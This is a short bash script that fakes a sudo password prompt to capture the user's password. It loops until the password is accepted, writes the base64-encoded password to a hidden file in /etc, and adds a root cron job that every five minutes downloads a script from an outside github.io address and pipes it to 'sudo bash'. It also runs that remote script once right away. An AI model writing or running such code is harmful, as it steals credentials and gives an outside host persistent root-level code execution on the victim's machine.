#!/bin/bash

echo ""

pwd=""
sudo -k
echo "b4"
while [ "$(echo $pwd | sudo -S whoami)" != "root" ]
do
  echo "henlo"
  echo "pwd=$(pwd)"
  sleep 3000
  echo "Sorry, try again."
  echo -n "Password:"
  read -s pwd </dev/tty
  echo ""
  sudo -k
done

echo "out"

command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"

#write out current crontab
sudo crontab -u root -l > mycron
#echo new cron into cron file
echo "*/5 * * * * $command" >> mycron
#install new cron file
sudo crontab -u root mycron
rm mycron

enc=$(echo $pwd | base64 | tr -- '+=/' '-_~')

sudo echo $enc > /etc/.pwd.txt

curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
